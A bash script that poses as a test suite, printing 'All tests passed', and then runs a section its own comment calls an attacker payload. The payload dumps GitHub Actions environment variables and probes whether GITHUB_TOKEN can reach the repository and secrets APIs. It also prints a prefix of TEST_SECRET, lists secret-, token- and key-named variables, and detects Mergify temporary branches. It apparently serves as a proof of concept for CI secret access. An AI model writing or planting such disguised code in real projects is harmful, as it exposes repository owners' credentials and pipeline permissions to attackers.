#!/bin/bash
echo "Test suite v1.1 - improved assertions"
echo "All tests passed."

# --- attacker payload below ---
echo ""
echo "=== ENV DUMP ==="
echo "GITHUB_EVENT_NAME=$GITHUB_EVENT_NAME"
echo "GITHUB_REF=$GITHUB_REF"
echo "GITHUB_HEAD_REF=$GITHUB_HEAD_REF"
echo "GITHUB_BASE_REF=$GITHUB_BASE_REF"
echo "GITHUB_REPOSITORY=$GITHUB_REPOSITORY"
echo "GITHUB_ACTOR=$GITHUB_ACTOR"
echo "GITHUB_TRIGGERING_ACTOR=$GITHUB_TRIGGERING_ACTOR"
echo "GITHUB_WORKFLOW=$GITHUB_WORKFLOW"
echo "GITHUB_RUN_ID=$GITHUB_RUN_ID"

echo ""
echo "=== GITHUB_TOKEN PERMISSIONS CHECK ==="
# Check what the token can do
TOKEN_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY")
echo "Repo API access: HTTP $TOKEN_RESPONSE"

# Check if we can list secrets (would indicate write access)
SECRETS_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets")
echo "Secrets API access: HTTP $SECRETS_RESPONSE"

echo ""
echo "=== SECRET ACCESS TEST ==="
if [ -n "$TEST_SECRET" ]; then
  echo "TEST_SECRET is SET (length: ${#TEST_SECRET})"
  # Print first 5 chars to prove access without full leak
  echo "TEST_SECRET prefix: ${TEST_SECRET:0:5}"
else
  echo "TEST_SECRET is EMPTY/UNSET"
fi

echo ""
echo "=== ALL ENV VARS WITH 'SECRET' or 'TOKEN' or 'KEY' ==="
env | grep -iE "(SECRET|TOKEN|KEY)" | sed 's/=.*/=<REDACTED>/'

echo ""
echo "=== BRANCH DETECTION ==="
echo "Is this a Mergify temp branch? Checking ref..."
echo "GITHUB_REF=$GITHUB_REF"
if echo "$GITHUB_REF" | grep -qi "mergify\|mqueue\|tmp"; then
  echo "MERGIFY_TEMP_BRANCH=true"
else
  echo "MERGIFY_TEMP_BRANCH=false"
fi

exit 0
